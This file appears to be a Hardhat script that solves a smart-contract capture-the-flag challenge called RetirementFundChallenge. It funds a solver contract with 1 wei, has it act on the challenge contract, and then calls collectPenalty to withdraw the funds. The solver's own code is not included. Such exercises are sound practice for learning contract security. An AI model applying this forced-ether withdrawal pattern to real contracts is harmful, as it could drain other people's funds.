const { ethers } = require('hardhat');

const DEPLOY = false;
const CHALLENGE_ADDRESS = '0xE2204C5f8B34a0D77c62c9B26cCe36b01Fb74C54';
const SOLVER_ADDRESS = '0x56292D3B584d7f53401DC069F4995211d2E1c263';

async function main() {
  const [owner] = await ethers.getSigners();

  const RetirementFundChallenge = await ethers.getContractFactory('RetirementFundChallenge');
  const contract = await RetirementFundChallenge.attach(CHALLENGE_ADDRESS);

  const RetirementFundChallengeSolver = await ethers.getContractFactory('RetirementFundChallengeSolver');

  let solver;
  if (DEPLOY) {
    solver = await RetirementFundChallengeSolver.deploy();
    await solver.deployed();
    console.log(`Solver address: ${solver.address}`);
  } else {
    solver = await RetirementFundChallengeSolver.attach(SOLVER_ADDRESS);
  }

  await owner.sendTransaction({
    to: solver.address,
    value: 1,
  });
  await solver.solveChallenge(CHALLENGE_ADDRESS);

  await contract.collectPenalty();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
